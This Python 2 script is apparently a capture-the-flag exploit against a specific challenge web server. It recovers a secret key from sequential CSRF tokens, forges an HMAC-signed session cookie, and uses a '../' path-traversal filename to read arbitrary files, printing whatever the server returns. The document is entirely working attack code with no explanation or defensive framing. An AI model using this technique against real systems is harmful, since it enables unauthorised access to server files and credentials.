#!/usr/bin/env python
#coding=utf-8
import re
import requests
import hmac
import base64
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
s = requests.session()
header = {'X-Requested-With': 'XMLHttpRequest'}
filename = '../../../../../../' + sys.argv[1]

def parse(token):
    d = []
    s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in xrange(len(token)):
        for j in xrange(len(s)):
            if token[i] == s[j]:
                d.append(j)
                break
    return d

def guess(d):
    s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    result = []
    for i in xrange(6):
        r = (d[31+i]+62-d[28+i])%62
        result.append(r)
    key = ''.join(s[j] for j in result)

    return (key,hmac.new(key,'fg_safebox').hexdigest())

def create_cookie(k):
    h2 = r'{"role":"\u0075\u0073\u0065\u0072"}'
    h1 = hmac.new(k,h2).hexdigest()
    return {'userinfo':base64.b64encode(h1+h2)}

r0 = s.get(url)
token0 = re.findall(r'(?<=value=").*?(?=")',r0.text)[-1]
d0 = parse(token0)
payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':'fg_safebox', 'key':'1234567'}
s.post(url,data=payload0, headers=header)
r1 = s.get(url)
token1 = re.findall(r'(?<=value=").*?(?=")',r1.text)[-1]
d1 = parse(token1)
pre =  [0,0,0,0,0,0]+d0+d1
#print pre
secret,key = guess(pre)
cookie = create_cookie(secret)
payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':'fg_safebox', 'key':key, 'method':'READ', 'filename':filename}
r2 = s.post(url,data=payload1, headers=header, cookies=cookie)
if 'Permission deny!!' not in r2.text:
#    print '[+]Done!'
#    with open('php.ini','w') as f:
#        f.write(r2.text)
    print r2.text
#    print r2.headers
#print r2.text
#r3 = s.get(url)
#token3 = re.findall(r'(?<=value=").*?(?=")',r3.text)[-1]
#print parse(token3)
